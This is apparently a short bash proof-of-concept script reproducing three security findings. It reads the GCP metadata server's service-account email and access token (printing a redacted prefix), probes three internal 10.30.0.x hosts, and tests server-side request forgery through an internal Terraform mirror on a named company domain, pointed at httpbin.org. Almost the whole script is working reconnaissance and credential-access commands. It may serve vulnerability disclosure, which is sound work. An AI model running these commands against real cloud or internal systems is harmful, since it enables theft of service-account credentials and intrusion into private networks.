#!/usr/bin/env bash

echo "=== FINDING 1: GCP Metadata ==="
echo "SA email:"
curl -sf --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google" || echo "TIMEOUT/BLOCKED"
echo ""

echo "SA token:"
curl -sf --max-time 5 \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" \
  | python3 -c "
import sys,json
t=json.load(sys.stdin)
print('type:', t['token_type'], '| expires:', t['expires_in'], '| prefix:', t['access_token'][:20]+'...[REDACTED]')
" || echo "TIMEOUT/BLOCKED"

echo ""
echo "=== FINDING 2: Internal network ==="
for host in "10.30.0.120:api" "10.30.0.102:blob" "10.30.0.104:relay"; do
  ip="${host%%:*}"; label="${host##*:}"
  code=$(curl -sf --max-time 5 "http://$ip/" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "TIMEOUT")
  echo "$label ($ip): $code"
done

echo ""
echo "=== FINDING 3: C4 mirror SSRF ==="
curl -si --max-time 10 --no-location \
  "http://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
  | grep -E "^HTTP/|^Location:" || echo "no response"

echo "=== done ==="